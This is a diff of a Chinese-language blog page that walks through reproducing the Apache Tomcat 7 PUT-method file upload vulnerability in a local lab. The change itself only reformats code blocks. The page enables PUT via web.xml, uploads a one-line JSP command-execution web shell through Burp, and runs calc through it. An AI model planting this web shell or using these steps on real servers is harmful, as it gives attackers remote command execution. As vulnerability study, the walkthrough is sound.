@@ -418,10 +418,14 @@
 <p>影响版本： Apache Tomcat 7.0.0 – 7.0.81</p>
 <h5 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h5><p>配置漏洞，开启put方法可上传文件功能。</p>
 <p>tomcat文件夹下的/conf/web.xml文件插入：</p>
-<pre><code>     &lt;init-param&gt;           &lt;param-name&gt;readonly&lt;/param-name&gt;           &lt;param-value&gt;false&lt;/param-value&gt;     &lt;/init-param&gt;</code></pre><p>重启tomcat服务。</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;init-<span class="built_in">param</span>&gt;           &lt;<span class="built_in">param</span>-name&gt;readonly&lt;/<span class="built_in">param</span>-name&gt;           &lt;<span class="built_in">param</span>-<span class="built_in">value</span>&gt;<span class="literal">false</span>&lt;/<span class="built_in">param</span>-<span class="built_in">value</span>&gt;     &lt;/init-<span class="built_in">param</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>重启tomcat服务。</p>
 <p><a href="https://image.3001.net/images/20181216/1544955083_5c1624cb8ac8a.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955083_5c1624cb8ac8a.png!small" alt="img"></a></p>
 <p>访问127.0.0.1：8080，burp抓包，send to Repeater，将请求方式改为PUT，创建一个122.jsp，并用%20转义空格字符。123.jsp内容为：</p>
-<pre><code>&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));%</code></pre><p>返回201，说明创建成功。</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="module-access"><span class="module"><span class="identifier">Runtime</span>.</span></span>get<span class="constructor">Runtime()</span>.exec(request.get<span class="constructor">Parameter(<span class="string">"cmd"</span>)</span>);%</span><br></pre></td></tr></table></figure>
+
+<p>返回201，说明创建成功。</p>
 <p><a href="https://image.3001.net/images/20181216/1544955095_5c1624d7b5447.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955095_5c1624d7b5447.png!small" alt="img"></a></p>
 <p>访问127.0.0.1：8080/122.jsp?cmd=calc。</p>
 <p>弹出计算器：</p>
